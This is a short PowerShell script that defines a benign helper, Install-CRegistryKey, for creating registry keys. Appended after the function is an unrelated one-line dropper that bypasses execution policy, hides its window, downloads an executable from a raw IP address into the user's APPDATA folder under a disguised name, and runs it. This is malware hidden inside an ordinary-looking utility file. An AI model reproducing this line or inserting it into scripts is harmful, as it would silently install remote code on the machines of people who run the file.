
function Install-CRegistryKey
{
    
    [CmdletBinding(SupportsShouldPRocess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Path
    )
    
    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    if( -not (Test-Path -Path $Path -PathType Container) )
    {
        New-Item -Path $Path -ItemType RegistryKey -Force | Out-String | Write-Verbose
    }
}



PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

